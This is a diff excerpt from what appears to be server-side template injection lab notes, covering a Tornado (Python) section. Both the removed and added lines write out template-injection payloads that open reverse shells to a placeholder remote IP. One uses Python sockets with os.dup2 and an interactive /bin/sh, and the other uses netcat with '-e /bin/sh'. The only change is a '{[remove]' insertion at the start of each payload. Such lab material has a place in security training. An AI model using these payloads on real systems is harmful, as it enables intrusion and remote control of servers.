@@ -39,11 +39,11 @@ shell
 ## LAB 3: Tornado (Python)
 
 ```
-{%import subprocess,socket,os%}{{s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)}}{{s.connect(("your_remote_ip",port))}}{{os.dup2(s.fileno(),0)}}{{ os.dup2(s.fileno(),1)}}{{ os.dup2(s.fileno(),2)}}{{p=subprocess.call(["/bin/sh","-i"])}}
+{[remove]%import subprocess,socket,os%}{{s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)}}{{s.connect(("your_remote_ip",port))}}{{os.dup2(s.fileno(),0)}}{{ os.dup2(s.fileno(),1)}}{{ os.dup2(s.fileno(),2)}}{{p=subprocess.call(["/bin/sh","-i"])}}
 ```
 
 ```
-{%import subprocess%} {{subprocess.Popen(["nc","your_remote_ip","port","-e","/bin/sh"])}}
+{[remove]%import subprocess%} {{subprocess.Popen(["nc","your_remote_ip","port","-e","/bin/sh"])}}
 ```
 
 ## LAB 4: Velocity (Java)
